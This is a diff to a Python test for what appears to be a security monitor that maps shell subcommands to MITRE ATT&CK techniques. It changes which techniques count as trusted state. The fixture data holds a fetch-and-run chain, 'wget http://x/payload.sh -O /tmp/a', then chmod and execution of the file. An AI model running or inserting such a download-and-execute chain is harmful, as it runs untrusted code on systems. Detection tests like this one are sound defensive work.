@@ -146,8 +146,11 @@ def test_session_monitor_records_ordered_subcommand_classifications():
 
     state = monitor.get_session("compound-1")
     assert state.commands == [command]
-    assert state.ttps == ["T1105", "T1222", "T1059"]
-    assert state.tactics == ["command-and-control", "defense-evasion", "execution"]
+    # A command-input event does not prove execution of conditional RHS
+    # fragments.  They remain visible as audit candidates but cannot enter
+    # trusted state/history without fragment-scoped outcome evidence.
+    assert state.ttps == ["T1105"]
+    assert state.tactics == ["command-and-control"]
     classified_commands = [
         event["command"]
         for event in state.classification_events
@@ -160,8 +163,8 @@ def test_session_monitor_records_ordered_subcommand_classifications():
     ]
     assert all(event.get("original_command") == command for event in state.classification_events)
     assert state.ttp_command_map["T1105"] == ["wget http://x/payload.sh -O /tmp/a"]
-    assert state.ttp_command_map["T1222"] == ["chmod +x /tmp/a"]
-    assert state.ttp_command_map["T1059"] == ["/tmp/a"]
+    assert "T1222" not in state.ttp_command_map
+    assert "T1059" not in state.ttp_command_map
     assert [event["source"] for event in state.classification_events] == [
         "rule",
         "rule",
